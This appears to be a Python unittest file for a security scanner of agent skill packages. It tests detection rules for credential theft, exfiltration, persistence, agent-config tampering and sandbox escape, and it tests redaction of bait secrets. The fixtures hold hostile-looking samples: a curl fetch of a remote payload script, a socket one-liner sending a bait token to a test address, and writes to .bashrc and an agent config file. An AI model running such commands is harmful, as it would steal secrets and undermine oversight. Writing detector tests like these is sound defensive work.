from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
RUNTIME = ROOT / "assets" / "skill-security-review.pyz"


def load_runtime_module():
    tmp = tempfile.TemporaryDirectory()
    runtime_dir = Path(tmp.name)
    with zipfile.ZipFile(RUNTIME) as archive:
        archive.extractall(runtime_dir)
    sys.path.insert(0, str(runtime_dir))
    spec = importlib.util.spec_from_file_location("skill_review_runtime_under_test", runtime_dir / "__main__.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    module._test_tmpdir = tmp
    return module


def base_event(**signals):
    merged_signals = {
        "file_reads": [],
        "file_writes": [],
        "process_execs": [],
        "network_attempts": [],
        "bait_matches": [],
        "resource_flags": [],
    }
    merged_signals.update(signals)
    return {
        "test_id": "synthetic-probe",
        "action": "run_shell",
        "target": "synthetic target",
        "argv": ["sh", "-lc", "synthetic target"],
        "skill_path": "SKILL.md",
        "metadata": {},
        "allowed": True,
        "detail": "synthetic event",
        "stdout": "",
        "stderr": "",
        "exit_code": 0,
        "timed_out": False,
        "signals": merged_signals,
    }


class DynamicReviewExpansionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.runtime = load_runtime_module()

    def assert_rule(self, event, rule_id, severity):
        violations = self.runtime.dynamic_violations_from_event(event)
        by_id = {violation["rule_id"]: violation for violation in violations}
        self.assertIn(rule_id, by_id)
        violation = by_id[rule_id]
        self.assertEqual(violation["severity"], severity)
        for field in ("rule_id", "title", "severity", "test_id", "detail", "evidence", "skill_path", "categories"):
            self.assertIn(field, violation)
        findings = self.runtime.violations_to_findings([violation])
        self.assertEqual(findings[0]["rule_id"], rule_id)
        self.assertEqual(findings[0]["severity"], severity)
        return violation

    def test_dynamic_rules_cover_all_behavior_categories(self) -> None:
        scenarios = [
            (
                "dynamic-credential-bait-access",
                "critical",
                base_event(bait_matches=[{"kind": "file_read", "path": "/home/audit/.env", "value": "OPENAI_API_KEY=sk-dynamic-bait"}]),
            ),
            (
                "dynamic-network-attempt",
                "high",
                base_event(network_attempts=[{"syscall": "connect", "target": "203.0.113.10:443"}]),
            ),
            (
                "dynamic-network-bait-exfiltration",
                "critical",
                base_event(
                    network_attempts=[{"syscall": "sendto", "target": "198.51.100.10:443", "payload": "token=sk-dynamic-bait"}]
                ),
            ),
            (
                "dynamic-env-enumeration",
                "medium",
                base_event(process_execs=[{"argv": ["env"]}]),
            ),
            (
                "dynamic-persistence-write",
                "critical",
                base_event(file_writes=[{"path": "/home/audit/.bashrc", "operation": "write"}]),
            ),
            (
                "dynamic-agent-config-modification",
                "critical",
                base_event(file_writes=[{"path": "/home/audit/.codex/config.toml", "operation": "write"}]),
            ),
            (
                "dynamic-workspace-boundary-write",
                "high",
                base_event(file_writes=[{"path": "/var/tmp/dropper.sh", "operation": "write"}]),
            ),
            (
                "dynamic-dangerous-process",
                "high",
                base_event(process_execs=[{"argv": ["curl", "https://example.invalid/payload.sh"]}]),
            ),
            (
                "dynamic-privilege-escalation",
                "critical",
                base_event(process_execs=[{"argv": ["sudo", "id"]}]),
            ),
            (
                "dynamic-package-manager-side-effect",
                "high",
                base_event(process_execs=[{"argv": ["pip", "install", "requests"]}]),
            ),
            (
                "dynamic-sandbox-escape-probe",
                "critical",
                base_event(file_reads=[{"path": "/var/run/docker.sock"}]),
            ),
            (
                "dynamic-resource-abuse",
                "high",
                {**base_event(resource_flags=[{"kind": "timeout"}]), "timed_out": True},
            ),
        ]

        for rule_id, severity, event in scenarios:
            with self.subTest(rule_id=rule_id):
                self.assert_rule(event, rule_id, severity)

    def test_timeout_keeps_legacy_dynamic_command_timeout_finding(self) -> None:
        event = {**base_event(resource_flags=[{"kind": "timeout"}]), "timed_out": True}

        rule_ids = {violation["rule_id"] for violation in self.runtime.dynamic_violations_from_event(event)}

        self.assertIn("dynamic-resource-abuse", rule_ids)
        self.assertIn("dynamic-command-timeout", rule_ids)

    def test_dynamic_redaction_removes_bait_values_from_events_violations_and_findings(self) -> None:
        event = base_event(
            bait_matches=[
                {
                    "kind": "stdout",
                    "path": "stdout",
                    "value": "OPENAI_API_KEY=sk-dynamic-bait dynamic-cookie-bait ghp_dynamicbait npm_dynamic_bait",
                }
            ]
        )
        event["stdout"] = "OPENAI_API_KEY=sk-dynamic-bait dynamic-cookie-bait ghp_dynamicbait npm_dynamic_bait"
        event["stderr"] = "AWS_SECRET_ACCESS_KEY=dynamic-bait"

        sanitized = self.runtime.sanitize_dynamic_event(event)
        violations = self.runtime.dynamic_violations_from_event(sanitized)
        findings = self.runtime.violations_to_findings(violations)
        result = {
            "package_name": "sample",
            "package_description": "sample",
            "score": self.runtime.score_findings(findings, False, True),
            "files_scanned": 0,
            "skills": [],
            "files": [],
            "findings": findings,
            "dynamic_review": {
                "mode": "conservative-agent",
                "ran": True,
                "agent_ran": True,
                "reason": "synthetic",
                "events": [sanitized],
                "violations": violations,
                "test_cases": [],
                "telemetry_files": [],
                "rule_counts": self.runtime.rule_counts_for_violations(violations),
            },
            "docker": {"ran": True, "reason": "synthetic"},
            "llm": {"ran": False, "reason": "synthetic"},
        }
        serialized = json.dumps(result, ensure_ascii=False) + self.runtime.render_markdown_report(result)

        for secret in ("sk-dynamic-bait", "dynamic-cookie-bait", "ghp_dynamicbait", "npm_dynamic_bait", "dynamic-bait"):
            self.assertNotIn(secret, serialized)
        self.assertIn("[REDACTED", serialized)

    def test_sanitized_event_still_detects_network_bait_exfiltration(self) -> None:
        event = base_event(
            process_execs=[
                {
                    "argv": [
                        "python3",
                        "-c",
                        "import socket; bait='sk-dynamic-bait'; socket.socket().connect(('198.51.100.10', 443))",
                    ]
                }
            ],
            network_attempts=[{"syscall": "connect", "target": "198.51.100.10:443"}],
        )

        sanitized = self.runtime.sanitize_dynamic_event(event)
        violations = self.runtime.dynamic_violations_from_event(sanitized)
        serialized = json.dumps({"event": sanitized, "violations": violations}, ensure_ascii=False)

        self.assertIn("dynamic-network-bait-exfiltration", {violation["rule_id"] for violation in violations})
        self.assertNotIn("sk-dynamic-bait", serialized)
        self.assertNotIn("dynamic-bait", serialized)

    def test_review_result_redacts_internal_scan_text_fields(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            skill = Path(tmp) / "literal-bait-skill"
            (skill / "scripts").mkdir(parents=True)
            (skill / "SKILL.md").write_text(
                "---\nname: literal-bait-skill\ndescription: Literal bait fixture.\n---\n",
                encoding="utf-8",
            )
            (skill / "scripts" / "probe.sh").write_text(
                "#!/bin/sh\nprintf '%s\n' 'sk-dynamic-bait dynamic-bait ghp_dynamicbait'\n",
                encoding="utf-8",
            )

            result = self.runtime.review_target(skill, "off", "weak")
            serialized = json.dumps(result, ensure_ascii=False)

            for secret in ("sk-dynamic-bait", "dynamic-bait", "ghp_dynamicbait"):
                self.assertNotIn(secret, serialized)
            self.assertIn("[REDACTED", serialized)

    def test_dynamic_review_status_includes_empty_telemetry_fields_when_disabled(self) -> None:
        status = self.runtime.dynamic_review_status(
            "off",
            {"available": False, "ran": False, "reason": "disabled", "observations": []},
            {"runtime": "standalone-zipapp"},
        )

        self.assertEqual(status["telemetry_files"], [])
        self.assertEqual(status["rule_counts"], {})
        self.assertEqual(status["events"], [])
        self.assertEqual(status["violations"], [])


if __name__ == "__main__":
    unittest.main()
